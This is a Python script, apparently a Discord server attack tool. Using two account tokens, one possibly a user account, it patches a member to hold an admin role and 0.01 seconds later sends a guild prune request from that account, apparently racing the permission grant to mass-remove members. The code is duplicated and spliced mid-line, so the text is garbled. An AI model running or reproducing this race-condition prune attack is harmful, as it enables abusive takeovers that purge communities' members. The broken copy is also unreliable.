import aiohttp
import asyncio
import os

token = "" #ur acc which has perms 
token2 = "" #ur other acc token
guild = 966612809695772725 #server id
member = 838487130778238978 #other acc user id
adminrole = 971783749077438564 #role to give to ur acc u wanna prune with
pruneroles = [] #roles to be included in prune example: [838487130778238978, 971783749077438564] note: important
headers = {"authorization": f"Bot {token}"} #headers = {"authorization": f"{token}"} if using user account!
headers2 = {"authorization": f"Bot {token2}"} #headers2 = {"authorization": f"{token2}"} if using user account!
loop = asyncio.get_event_loop()


async def addrole():
  print("Adding role...")
  json = {
    "roles": [adminrole]
  }
  async with aiohttp.ClientSession() as session:
    async with session.patch(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers, json=json) as req:
      if req.status in [200, 201, 204]:
        print(f"Successfully added role | {req.status}")
      else:
        print(f"Unsuccessful add role attempt | {req.status}")
  

async def prune():
  print("Pruning...")
  json = {
    "days": 1,
    "include_roles": pruneroles,
    "reason": None
  }
  async with aiohttp.ClientSession() as session:
    async with session.post(f"https://discord.com/api/v9/guilds/{guild}/prune", headers=headers2, json=json) as req:
      if req.status in [200, 201, 204]:
        print(f"Successfully pruned | {req.status}")
      else:
        print(f"Unsuccessful prune attempt | {req.status}")

async def tasks():
  amdrole = loop.create_task(addrole())
  await asyncio.sleep(0.01)
  prume = loop.create_task(prune())
  await asyncio.wait([amdrole, prume])

loop.run_until_complete(tasks()import aiohttp
import asyncio
import os

token = "" #ur acc which has perms 
token2 = "" #ur other acc token
guild = 966612809695772725 #server id
member = 838487130778238978 #other acc user id
adminrole = 971783749077438564 #role to give to ur acc u wanna prune with
pruneroles = [] #roles to be included in prune example: [838487130778238978, 971783749077438564] note: important
headers = {"authorization": f"Bot {token}"} #headers = {"authorization": f"{token}"} if using user account!
headers2 = {"authorization": f"Bot {token2}"} #headers2 = {"authorization": f"{token2}"} if using user account!
loop = asyncio.get_event_loop()


async def addrole():
  print("Adding role...")
  json = {
    "roles": [adminrole]
  }
  async with aiohttp.ClientSession() as session:
    async with session.patch(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers, json=json) as req:
      if req.status in [200, 201, 204]:
        print(f"Successfully added role | {req.status}")
      else:
        print(f"Unsuccessful add role attempt | {req.status}")
  

async def prune():
  print("Pruning...")
  json = {
    "days": 1,
    "include_roles": pruneroles,
    "reason": None
  }
  async with aiohttp.ClientSession() as session:
    async with session.post(f"https://discord.com/api/v9/guilds/{guild}/prune", headers=headers2, json=json) as req:
      if req.status in [200, 201, 204]:
        print(f"Successfully pruned | {req.status}")
      else:
        print(f"Unsuccessful prune attempt | {req.status}")

async def tasks():
  amdrole = loop.create_task(addrole())
  await asyncio.sleep(0.01)
  prume = loop.create_task(prune())
  await asyncio.wait([amdrole, prume])

loop.run_until_complete(tasks()))
